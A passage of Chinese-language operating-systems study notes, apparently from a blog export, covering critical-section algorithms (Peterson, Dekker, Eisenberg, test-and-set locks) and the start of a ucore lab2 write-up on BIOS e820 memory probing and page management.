<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave note_1;</span><br><span class="line">while(note_2) &#123;</span><br><span class="line">   do nothing;</span><br><span class="line">&#125; </span><br><span class="line">if(no bread)&#123;</span><br><span class="line">  buy bread;</span><br><span class="line">&#125;</span><br><span class="line">remove note_1;</span><br></pre></td></tr></table></figure>
<p>如果没有便签2,那么A可以去买面包，否则循环等待B直到离开</p>
<p>进程B</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave note_2;</span><br><span class="line">if(no note_1) &#123;</span><br><span class="line">   if(no bread)&#123;</span><br><span class="line">      buy bread; </span><br><span class="line">   &#125; </span><br><span class="line">&#125;</span><br><span class="line">remove note_2;</span><br></pre></td></tr></table></figure>
<p>如果没有便签1,那么B可以去买面包，否则B离开并且再试一次。</p>
<p>枚举所有可能后，可能确认有效。</p>
<p>分析</p>
<ul>
<li>它有效，但太复杂，难以验证有效性</li>
<li>A和B代码不同，每个进程的代码略有不同，更多进程的情况更为复杂</li>
<li>当A在等待时，它不能做其他事，这称为忙等待（busy-waiting）</li>
</ul>
<blockquote>
<p>方案五</p>
</blockquote>
<p>利用两个原子操作实现一个锁（lock），处理过程不会被打断</p>
<p><code>Lock.Acquire()</code></p>
<ul>
<li>在锁被释放前一直等待，然后获得锁</li>
<li>如果两个线程都在等待同一个锁，并且同时发现锁被释放了，那么只有一个能够获得锁</li>
</ul>
<p><code>Lock.Release()</code></p>
<ul>
<li>解锁并唤醒任何等待中的进程</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">breadlock.Acquire(); &#x2F;&#x2F; 进入临界区</span><br><span class="line">if(noBread) &#123;</span><br><span class="line">  buy bread;</span><br><span class="line">&#125;</span><br><span class="line">breadlock.Release(); &#x2F;&#x2F; 退出临界区</span><br></pre></td></tr></table></figure>
<h2 id="进程的交叉关系"><a href="#进程的交叉关系" class="headerlink" title="进程的交叉关系"></a>进程的交叉关系</h2><table>
<thead>
<tr>
<th>相互感知的程序</th>
<th>交互关系</th>
<th>进程间的影响</th>
</tr>
</thead>
<tbody><tr>
<td>相互不感知(完全不了解其他进程的存在)</td>
<td>独立</td>
<td>一个进程的操作对其他进程的结果无影响</td>
</tr>
<tr>
<td>间接感知(双方都与第三方交互，如共享资源)</td>
<td>通过共享进行协作</td>
<td>一个进程的结果依赖于共享资源的状态</td>
</tr>
<tr>
<td>直接感知(双方直接交互，如通信)</td>
<td>通过通信进行协作</td>
<td>一个进程的结果依赖于从其他进程获得的信息</td>
</tr>
</tbody></table>
<p><strong>关系</strong>：</p>
<ol>
<li><strong>互斥（mutual exclusion）</strong>一个进程占用资源，其他进程不能使用</li>
<li><strong>死锁（deadlock）</strong>多个进程占用部分资源，形成循环等待</li>
<li><strong>饥饿（starvation）</strong> 其他进程可能轮流占用资源，一个进程一直得不到资源</li>
</ol>
<h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>进程中访问临界资源的一段需要互斥执行的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">entry section</span><br><span class="line">  critical section</span><br><span class="line">exit section</span><br><span class="line">  remainder section</span><br></pre></td></tr></table></figure>
<p><strong>访问规则：</strong>(互斥访问)</p>
<ul>
<li><strong>空闲则入</strong></li>
<li><strong>忙则等待</strong> 有进程在临界区时，其他进程均不能进入临界区 </li>
<li><strong>有限等待</strong> 等待进入临界区的进程不能无限期等待(对等待时间有约定)</li>
<li><strong>让权等待（可选）</strong> 不能进入临界区的进程，应释放CPU（如转换到阻塞状态）</li>
</ul>
<p><strong>实现方法</strong>：</p>
<ol>
<li><strong>禁用中断</strong> 无法响应中断</li>
<li><strong>软件方法</strong> 共享变量协调，复杂</li>
<li><strong>更高级的抽象方法</strong> 借用操作系统服务来提供同步的服务(引入管理者)</li>
</ol>
<h2 id="禁用硬件中断同步方法"><a href="#禁用硬件中断同步方法" class="headerlink" title="禁用硬件中断同步方法"></a>禁用硬件中断同步方法</h2><p>没有中断，没有上下文切换，因此没有并发</p>
<ul>
<li>硬件将中断处理延迟到中断被启用之后</li>
<li>现代计算机体系结构都提供指令来实现禁用中断</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">local_irq_save(unsigned long flags);</span><br><span class="line">critical section</span><br><span class="line">local_irq_restore(unsigned long flags);</span><br></pre></td></tr></table></figure>
<p>进入临界区：禁止所有中断，并保存标志<br>离开临界区：使能所有中断，并恢复标志</p>
<p><strong>缺点</strong>：</p>
<ul>
<li>禁用中断后，进程无法被停止</li>
<li>可能导致其他进程没有执行机会，处于饥饿</li>
<li>临界区可能很长 无法确定响应中断的时间(可能存在硬件影响)</li>
<li>不得不用时使用</li>
</ul>
<h2 id="基于软件的同步方法"><a href="#基于软件的同步方法" class="headerlink" title="基于软件的同步方法"></a>基于软件的同步方法</h2><p>两个线程，T0和T1</p>
<p>线程Ti的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">  enter section &#x2F;&#x2F; 进入区</span><br><span class="line">    critica sectio</span><br><span class="line">  exit section &#x2F;&#x2F;退出区</span><br><span class="line">    remainder section</span><br><span class="line">&#125;while(1);</span><br></pre></td></tr></table></figure>
<p>在进入区和退出区对变量修改来同步他们之间的行为。</p>
<p>线程可通过共享一些共有变量来同步他们的行为。</p>
<p><strong>第一次尝试</strong>(单标志法)</p>
<p>共享变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int turn &#x3D; 0;</span><br><span class="line">turn &#x3D; i; &#x2F;&#x2F; 表示允许进入临界区的线程ID</span><br></pre></td></tr></table></figure>
<p>线程Ti的代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">    while(turn !&#x3D; i) ; &#x2F;&#x2F; 不是i的话进入不了临界区</span><br><span class="line">    critical section</span><br><span class="line">    turn &#x3D; j;</span><br><span class="line">    remainder section</span><br><span class="line">&#125;while(1);</span><br></pre></td></tr></table></figure>
<p>该方案类似买面包方案四，同样有效。通过修改id交替进入，Ti不在临界区，Tj想要继续运行，但是必须等待Ti进入过临界区以后。满足“忙则等待”，但是有时不满足“空闲则入”</p>
<p><strong>第二次尝试</strong> (双标志法先检查)</p>
<p>先判断，后修改变量</p>
<p>共享变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int flag[2]; </span><br><span class="line">flag[0] &#x3D; flag[1] &#x3D; 0;</span><br><span class="line">flag[i] &#x3D;&#x3D; 1&#x2F;&#x2F;表示线程Ti是否在临界区</span><br></pre></td></tr></table></figure>
<p>线程Ti的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">    while (flag[j] &#x3D;&#x3D; 1) ;</span><br><span class="line">    flag[i] &#x3D; 1;</span><br><span class="line">    critical section</span><br><span class="line">    flag[i] &#x3D; 0;	</span><br><span class="line">    remainder section</span><br><span class="line">&#125; while (1);</span><br></pre></td></tr></table></figure>
<p>对应买面包方案二，二者可能存在同时判断，同时设置，均进入临界区的情况，不满足“忙则等待”</p>
<p><strong>第三次尝试</strong>(双标志法后检查)</p>
<p>先修改变量，后判断</p>
<p>共享变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int flag[2]; </span><br><span class="line">flag[0] &#x3D; flag[1] &#x3D; 0;</span><br><span class="line">flag[i] &#x3D;&#x3D; 1&#x2F;&#x2F; 表示线程Ti想要进入临界区</span><br></pre></td></tr></table></figure>
<p>线程Ti的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">    flag[i] &#x3D; 1;</span><br><span class="line">    while (flag[j] &#x3D;&#x3D; 1) ;</span><br><span class="line">    critical section</span><br><span class="line">    flag[i] &#x3D; 0;	</span><br><span class="line">    remainder section</span><br><span class="line">&#125; while (1);</span><br></pre></td></tr></table></figure>
<p>对应买面包的方案三，有可能谁都进入不了临界区，满足“忙则等待”，但是不满足“空闲则入”</p>
<blockquote>
<p>Peterson算法(双标志+单标志法)</p>
</blockquote>
<p>满足线程Ti和Tj之间互斥的经典的基于软件的解决方法（1981年）</p>
<p>先修改变量，后判断；后修改者等待；只适用于两个进程</p>
<p><strong>共享变量</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int turn;&#x2F;&#x2F;表示该谁进入临界区</span><br><span class="line">boolean flag[];&#x2F;&#x2F;表示进程是否准备好进入临界区</span><br></pre></td></tr></table></figure>
<p><strong>进入区代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag[i] &#x3D; true;</span><br><span class="line">turn &#x3D; j;&#x2F;&#x2F;写数据总有一前一后，不可能同时完成</span><br><span class="line">while (flag[j] &amp;&amp; turn &#x3D;&#x3D;j)</span><br></pre></td></tr></table></figure>
<p><strong>退出区代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag[i] &#x3D; false;</span><br></pre></td></tr></table></figure>
<p>线程Ti 的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do &#123;</span><br><span class="line">      flag[i] &#x3D; true;</span><br><span class="line">      turn &#x3D; j;</span><br><span class="line">      while ( flag[j] &amp;&amp; turn &#x3D;&#x3D; j);</span><br><span class="line">      CRITICAL SECTION</span><br><span class="line">      flag[i] &#x3D; false;</span><br><span class="line">      REMAINDER SECTION</span><br><span class="line">   &#125; while (true);</span><br></pre></td></tr></table></figure>
<p>j执行时i等待，退出后i可执行</p>
<p>piazza上给出了Peterson算法三个线程的反例</p>
<p>线程0，1，2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">turn&#x3D;1，flag[1]&#x3D;false，flag[0] &#x3D; true，flag[2] &#x3D; true</span><br></pre></td></tr></table></figure>
<p>在线程T0和T2的peterson算法实现中，只要<code>flag[j]=true</code>和<code>turn=j</code>任意一个不满足，（理论上）T0，T2就可以进入临界区。由前面假设可得，<code>flag[1] = false</code>，此时<code>while(flag[j]&amp;&amp;turn==j)</code>不足以阻塞T0,T2，两个线程都满足进入临界区的条件，不满足临界区的“忙则等待”规则。</p>
<blockquote>
<p>Dekkers算法</p>
</blockquote>
<p>线程Ti 的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag[0]:&#x3D; false; flag[1]:&#x3D; false; turn:&#x3D; 0;&#x2F;&#x2F;or1 </span><br><span class="line">	</span><br><span class="line">do &#123;</span><br><span class="line">       flag[i] &#x3D; true;</span><br><span class="line">       while flag[j] &#x3D;&#x3D; true &#123; </span><br><span class="line">            if turn ≠ i &#123; </span><br><span class="line">               flag[i] :&#x3D; false </span><br><span class="line">               while turn ≠ i &#123; &#125; </span><br><span class="line">               flag[i] :&#x3D; true </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; </span><br><span class="line">        CRITICAL SECTION</span><br><span class="line">        turn :&#x3D; j</span><br><span class="line">        flag[i] &#x3D; false;</span><br><span class="line">        REMAINDER SECTION</span><br><span class="line">   &#125; while (true);</span><br></pre></td></tr></table></figure>
<p>判断复杂，i执行时发现j也想进入，turn此时不为i,则将i自己的标志位改为false，并等待turn修改为i再执行，便于扩展。</p>
<p>进入区：先修改flag，后判断是否有多个想进入；后修改者等待；<br>退出区：修改turn；<br>适用于多个进程；</p>
<p>把Dekkers算法中的flag[i] := false去掉后：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[<span class="number">0</span>]:= <span class="literal">false</span>; flag[<span class="number">1</span>]:= <span class="literal">false</span>; turn:= <span class="number">0</span>;<span class="comment">//or1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">     flag[i] = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">while</span> flag[j] == <span class="literal">true</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> turn ≠ i &#123;</span><br><span class="line">         <span class="keyword">while</span> turn ≠ i &#123; &#125;</span><br><span class="line">         flag[i] := <span class="literal">true</span></span><br><span class="line">       &#125; </span><br><span class="line">     &#125;</span><br><span class="line">     CRITICAL SECTION</span><br><span class="line">     turn := j</span><br><span class="line">     flag[i] = <span class="literal">false</span>;</span><br><span class="line">     REMAINDER SECTION</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>错误例子：</p>
<p>两个进程都进入do-while循环，而后<code>flag[0] = true</code>且<code>flag[1] = true</code>，同时进入<code>while flag[j] == true</code>循环。这时若果<code>turn=1</code>，则0号进程进入if后在<code>while turn ≠ i</code> 处死循环，1号进程在<code>while flag[j] == true</code> 处死循环。</p>
<p><strong>N线程的软件方法</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3da73e6bb3695538.png"></p>
<p><strong>Eisenberg算法</strong></p>
<p>可参考<a href="https://en.wikipedia.org/wiki/Peterson's_algorithm">维基百科</a> ，该算法将n个进程形成一个圈，依照这个圈的顺序来分发资源。</p>
<p>首先这个算法需要维护这样的数据结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shared enum states &#123;IDLE, WAITING, ACTIVE&#125; flags[n];</span><br><span class="line"></span><br><span class="line">shared int turn;</span><br><span class="line"></span><br><span class="line">int index;        &#x2F;* not shared! *&#x2F;</span><br></pre></td></tr></table></figure>
<p>其中，<code>flags[i]=IDLE</code>：进程Pi不想进入临界区；</p>
<p><code>flags[i]=WAITING</code>：进程Pi想进入临界区；</p>
<p><code>flags[i]=ACTIVE</code>：进程想进或已进临界区。</p>
<p>flags的所有元素初值都是IDLE；</p>
<p>turn的初值为0到n-1之间的任一正整数，它表示允许进入临界区的进程编号；</p>
<p>index为每个进程拥有的一个局部变量，其初值为0到n-1之间的任一正整数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">repeat &#123;</span><br><span class="line">    <span class="comment">/* announce that we need the resource */</span></span><br><span class="line">    flags[i] = WAITING; <span class="comment">//（0）语句</span></span><br><span class="line">	<span class="comment">//循环1开始</span></span><br><span class="line">    index = turn;</span><br><span class="line">    <span class="keyword">while</span> (index != i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag[index] != IDLE) index = turn;<span class="comment">//条件1</span></span><br><span class="line">        <span class="keyword">else</span> index = index+<span class="number">1</span> mod n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//循环1结尾</span></span><br><span class="line">    flags[i] = ACTIVE; <span class="comment">//（1）语句</span></span><br><span class="line">	<span class="comment">//循环2开始</span></span><br><span class="line">    <span class="comment">/* find the first active process besides ourselves, if any */</span></span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((index &lt; n) &amp;&amp; <span class="comment">//条件2 </span></span><br><span class="line">	((index == i) || (flags[index] != ACTIVE)))  <span class="comment">//条件3</span></span><br><span class="line">    &#123;</span><br><span class="line">        index = index+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    	<span class="comment">//循环2结尾</span></span><br><span class="line"><span class="comment">//最终判断</span></span><br><span class="line">&#125; until ((index &gt;= n)  <span class="comment">//条件4</span></span><br><span class="line">	&amp;&amp; ((turn == i)|| (flags[turn] == IDLE))); <span class="comment">//条件5</span></span><br></pre></td></tr></table></figure>
<p>我们考虑第i个进程：<br>turn是一个关键的变量，它决定谁现在能进入临界区。有2种情况：<br>1.turn是一个随机的值，此时没有任何人申请资源<br>2.turn是某个申请资源的进程的编号</p>
<p>我们要验证turn到底处于哪一种情况，如果是第一种情况，那么即使turn≠i，我们也可以进入临界区，如果是第二种情况，那么我们得等到turn号进程执行完成。</p>
<p>第零步，初始状态，申请之后，还处于IDLE状态</p>
<p>第一步，进入WAITING状态，并检查[turn,i)区间内有没有申请资源的进程，有则等待它们执行完毕，没有则进入第二步</p>
<p>第二步，进入ACTIVE状态，并试图寻找一个其它的处于ACTIVE状态的进程，如果没找到，则获得资源的控制权，如果找到了，则回到WAITING状态</p>
<p>为何能解决同步互斥问题？<br>首先有一个序，从turn开始，越前面的进程越优先获得资源。<br>其次，如果执行到一半，突然有序号在自己之前的进程申请资源，自己会放弃资源的申请，等待序号靠前的进程结束。</p>
<blockquote>
<p>正确性证明</p>
</blockquote>
<p><strong>互斥进入</strong></p>
<p> 实际上循环2就已经实现了互斥进入，即只能有一个进程进入临界区，即只有第一个设置ACTIVE的才有可能进入临界区。 这里的第一个是指在写之前flags全不是ACTIVE，写后第一个变为ACTIVE，如果有进程写了然后循环回去又改成了WAITING，则下一个第一个改ACTIVE的才有可能进入临界区。 因为先设置ACTIVE并还没有循环回去的进程会让其他进程在数ACTIVE数目时都发现不只自己，这样就进不到临界区。因此循环2保证了在临界区没有进程时最多一个进程可能进入临界区。然后，如果有一个进程进入了临界区，那么，该进程的flags必定为ACTIVE，继而阻止了其他所有进程在循环2中将index加到n，所以这时没有进程能再进去，除非临界区的进程退出临界区，改了自己的flags。</p>
<p>综上，互斥进入得证。</p>
<p><strong>空闲则入</strong></p>
<p>下面给出空闲则入的证明：</p>
<p>使用反证法：</p>
<p>如果不满足空闲则入，那么必然存在一种情况，所有进入竞争区的进程都在repeat循环里出不来</p>
<p>首先看repeat循环的特点是，</p>
<p>（a）只要进入了这个竞争区，flags就一定不是IDLE；</p>
<p>（b）最靠近turn的进程必然能够通过循环1</p>
<p> 因此，如果所有进程都出不去，那么经过充分而有限的时间t‘（我们假设每个进程都有机会获得CPU），所有竞争区的进程的flags必定都非IDLE，而且在更充分的时间t0后，所有进程在循环1中判断时，涉及的在竞争区内的进程的flags都非IDLE，那么这时，就只有最靠近turn的那个进程能够通过循环1。</p>
<p> 即使在这个充分而有限的时间t0内有新进程进入，根据假设，所有进程还是都出不去，那么仍然会有一个时间t1，使只有最靠近turn的那个进程通过循环1，由于进程总数是有限的，所以这种时间的增长是有限的，于是在一个有限的时间t后，只有最靠近turn的那个进程能够通过循环1。</p>
<p> 显然，此时这个进程可以通过循环2将index加到n，由于其距离turn最近，说明turn就是该进程或者turn的flags为IDLE，于是该进程进入临界区（即使此时turn对应的那个进程进入repeat改了flags也没关系，只是再次增大了t而已）</p>
<p>综上，假设错误，满足空闲则入.</p>
<p>由此，该算法正确 (只要保证调度过程不会有某一进程在无限时间内获取不到CPU的情况，显然这一点一般是可以保证的)</p>
<p>实际上，只有turn对应的进程没有指向进入repeat的一个进程，并且发生了很多次非常极端的情况时，上面的t才会比较长，而上面证明了t依然有限，所以该算法有效。</p>
<p><strong>基于软件的解决方法分析</strong></p>
<ul>
<li><strong>复杂</strong> 需要两个进程间的共享访问项</li>
<li><strong>需要忙等待</strong> 浪费CPU时间，需要频繁查询共享变量</li>
</ul>
<h2 id="高级抽象的同步方法"><a href="#高级抽象的同步方法" class="headerlink" title="高级抽象的同步方法"></a>高级抽象的同步方法</h2><p>硬件提供一些同步原语</p>
<ul>
<li>中断禁用</li>
<li>原子操作指令(从硬件上保证其原子性)</li>
</ul>
<p><strong>锁(Lock)</strong></p>
<p>一个抽象的数据结构</p>
<ul>
<li>一个二进制变量(锁定/解锁)</li>
<li><code>Lock::Acquire()</code><ul>
<li>锁被释放前一直等待，然后得到锁</li>
</ul>
</li>
<li><code>Lock::Release()</code><ul>
<li>释放锁，唤醒任何等待的进程</li>
</ul>
</li>
</ul>
<p>使用锁来控制临界区访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lock_next_pid-&gt;Acquire();</span><br><span class="line">new_pid &#x3D; next_pid++;</span><br><span class="line">lock_next_pid-&gt;Release();</span><br></pre></td></tr></table></figure>
<p><strong>原子操作指令</strong></p>
<p>现在CPU体系结构提供的特殊原子指令</p>
<blockquote>
<p>测试和置位指令(TS Test-and-Set)</p>
</blockquote>
<ul>
<li>从内存单元中读取值</li>
<li>测试该值是否为1(真或假)</li>
<li>内存单元值设置为1</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">boolean <span class="title">TestAndSet</span><span class="params">(boolean *target)</span> </span>&#123;</span><br><span class="line">    boolean rv = *target;</span><br><span class="line">    *target = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> rv:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>交换指令(Exchange)</p>
</blockquote>
<p>交换内存中的两个值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Exchange</span> <span class="params">(boolean *a, boolean *b)</span></span>&#123;</span><br><span class="line">    boolean temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TS指令实现自旋锁(Spinlock)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Lock &#123;</span><br><span class="line">    int value &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">Lock::Acquire() &#123;</span><br><span class="line">   while (test-and-set(value))</span><br><span class="line">      ; &#x2F;&#x2F;spin</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果锁被释放，那么TS指令读取0并设置为1</span><br><span class="line">&#x2F;&#x2F;锁将被设置为忙等待状态</span><br><span class="line">Lock::Release() &#123;</span><br><span class="line">    value &#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果锁处于忙等待状态，那么TS指令读取1并将值设置为1。</p>
<ul>
<li>不改变锁的状态且需要循环</li>
</ul>
<p><strong>TS指令实现无忙等待锁</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lock</span> &#123;</span></span><br><span class="line">   <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">   WaitQueue q;</span><br><span class="line">&#125;</span><br><span class="line">Lock::Acquire() &#123;</span><br><span class="line">   <span class="keyword">while</span> (test-<span class="keyword">and</span>-<span class="built_in">set</span>(value)) &#123;</span><br><span class="line">      add <span class="keyword">this</span> TCB to wait <span class="built_in">queue</span> q;</span><br><span class="line">      schedule();</span><br><span class="line">      <span class="comment">//通过调度让其余进程继续执行</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">Lock::Release() &#123;</span><br><span class="line">   value = <span class="number">0</span>;</span><br><span class="line">   remove one thread t from q;</span><br><span class="line">   wakeup(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>原子操作指令锁特征</strong></p>
<ul>
<li>优点<ul>
<li>适用于单处理机或者共享内存的多处理机中任意数量的进程同步(禁用中断只适用于单处理机 多处理机的情况下 禁止单个处理机的中断 其他处理机仍然能够响应中断)</li>
<li>简单且容易证明</li>
<li>支持多临界区</li>
</ul>
</li>
<li>缺点<ul>
<li>忙等待锁会消耗处理机时间</li>
<li>可能导致饥饿,进程离开临界区时有多个等待进程的情况(并没有按照先来后到的顺序)</li>
</ul>
</li>
<li>死锁<ul>
<li>拥有临界区的低优先级进程，但请求访问临界区的高优先级进程获得处理机并等待临界区(低优先级等CPU,高优先级等临界区)</li>
</ul>
</li>
</ul>
<h1 id="同步方法总结"><a href="#同步方法总结" class="headerlink" title="同步方法总结"></a>同步方法总结</h1><p>锁是一种高级的同步抽象方法</p>
<ul>
<li>互斥可以使用锁来实现</li>
<li>需要硬件支持</li>
</ul>
<p><strong>常用三种同步实现方法总结</strong></p>
<ul>
<li>禁用中断(仅限于单处理机)</li>
<li>软件方法(共享变量 条件弱但是复杂) </li>
<li>原子操作指令(单处理机或多处理机均可)</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore lab2</title>
    <url>/systems/ucore-lab2/</url>
    <content><![CDATA[<p>ucore lab1初步实现了一个可以读磁盘并且加载ELF执行文件格式的系统，也可以响应和显示字符。仅仅如此并不足以满足操作系统的要求，进程在执行过程中需要系统分配内存等资源。为了高效地管理内存，ucore lab2采用了段页式机制，把其中段式内存的功能弱化，实现以分页为主的内存管理。</p>
<a id="more"></a>

<p>与lab1相比，lab2有两方面的扩展，首先，<code>bootloader</code>的工作有增加， 在<code>bootloader</code>中，完成了对物理内存资源的探测工作，让<code>ucore kernel</code>在后续执行中能够基于<code>bootloader</code>探测出的物理内存情况进行物理内存管理初始 化工作。其次，<code>bootloader</code>不像lab1那样，直接调用<code>kern_init</code>函数，而是先调用位于<code>/kern/init/entry.S</code>中的<code>kern_entry</code>函数。<code>kern_entry</code>函数的主要任务是为执行<code>kern_init</code>建立 一个良好的C语言运行环境（设置堆栈），而且临时建立了一个段映射关系，为之后建立分页机制的过程做一个准备。</p>
<p><code>kern_init</code>函数在完成一些输出并对lab1实验结果的检查后，将进入物理内存管理初始化的工作，即调用<code>pmm_init</code>函数完成物理内存的管理，这也是我们lab2的内容。接着是执行中断和异常相关的初始化工作，即调用<code>pic_init</code>函数和<code>idt_init</code>函数等，这些工作与lab1的中断异常初始化工作的内容是相同的。</p>
<h1 id="探测系统物理内存布局"><a href="#探测系统物理内存布局" class="headerlink" title="探测系统物理内存布局"></a>探测系统物理内存布局</h1><p>一般来说，获取内存大小的方法有BIOS中断调用和直接探测两种，但BIOS中断调用方法只能在实模式下完成，而直接探测必须在保护模式下完成。通过BIOS中断获取系统布局有三种方式，分别为88h,e801h,e820h,但是并非在所有情况中这三种模式都可以工作。在lab中，我们通过e820h中断来获取内存信息。BIOS中断必须在实模式下工作，故我们在<code>bootloader</code>进入保护模式之前调用E820h中断，将映射结构保存在物理地址0x8000处。<br>BIOS通过系统内存映射地址描述符（Address Range Descriptor）格式来表示系统物理内存布局，其具体表示如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e820map</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> nr_map;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">uint64_t</span> addr;<span class="comment">//8字节，系统内存块基地址</span></span><br><span class="line">        <span class="keyword">uint64_t</span> size;<span class="comment">//8字节，系统内存大小</span></span><br><span class="line">        <span class="keyword">uint32_t</span> type;<span class="comment">//4字节，内存类型</span></span><br><span class="line">    &#125; __attribute__((packed)) <span class="built_in">map</span>[E820MAX];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>物理内存的探测是在<code>bootasm.S</code>中实现的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">probe_memory:</span><br><span class="line"><span class="comment">//对0x8000处的32位单元清零,即给位于0x8000处的</span></span><br><span class="line"><span class="comment">//struct e820map的成员变量nr_map清零</span></span><br><span class="line">                  movl $<span class="number">0</span>, <span class="number">0x8000</span></span><br><span class="line">                  xorl %ebx, %ebx</span><br><span class="line"><span class="comment">//表示设置调用INT 15h BIOS中断后，BIOS返回的映射地址描述符的起始地址</span></span><br><span class="line">                  movw $<span class="number">0x8004</span>, %di</span><br><span class="line">start_probe:</span><br><span class="line">                  movl $<span class="number">0xE820</span>, %eax <span class="comment">// INT 15的中断调用参数</span></span><br><span class="line"><span class="comment">//设置地址范围描述符的大小为20字节，其大小等于struct e820map的成员变量map的大小</span></span><br><span class="line">                  movl $<span class="number">20</span>, %ecx</span><br><span class="line"><span class="comment">//设置edx为534D4150h (即4个ASCII字符“SMAP”)，这是一个约定</span></span><br><span class="line">                  movl $SMAP, %edx</span><br><span class="line"><span class="comment">//调用int 0x15中断，要求BIOS返回一个用地址范围描述符表示的内存段信息</span></span><br><span class="line">                  <span class="keyword">int</span> $<span class="number">0x15</span></span><br><span class="line"><span class="comment">//如果eflags的CF位为0，则表示还有内存段需要探测</span></span><br><span class="line">                  jnc cont</span><br><span class="line"><span class="comment">//探测有问题，结束探测</span></span><br><span class="line">                  movw $<span class="number">12345</span>, <span class="number">0x8000</span></span><br><span class="line">                  jmp finish_probe</span><br><span class="line">cont:</span><br><span class="line"><span class="comment">//设置下一个BIOS返回的映射地址描述符的起始地址</span></span><br><span class="line">                  addw $<span class="number">20</span>, %di</span><br><span class="line"><span class="comment">//递增struct e820map的成员变量nr_map</span></span><br><span class="line">                  incl <span class="number">0x8000</span></span><br><span class="line"><span class="comment">//如果INT0x15返回的ebx为零，表示探测结束，否则继续探测</span></span><br><span class="line">                  cmpl $<span class="number">0</span>, %ebx</span><br><span class="line">                  jnz start_probe</span><br><span class="line">finish_probe:</span><br></pre></td></tr></table></figure>
<p>BIOS查找出各个部分的内存布局条目，放入到一个保存地址范围描述符结构的缓冲区中，以便于后续的ucore的物理内存管理。</p>
<h1 id="以页为单位管理物理内存"><a href="#以页为单位管理物理内存" class="headerlink" title="以页为单位管理物理内存"></a>以页为单位管理物理内存</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;              <span class="comment">// page frame&#x27;s reference counter</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;       <span class="comment">// array of flags that describe the status of the page frame</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;<span class="comment">// the num of free block, used in first fit pm manager</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;<span class="comment">// free list link</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
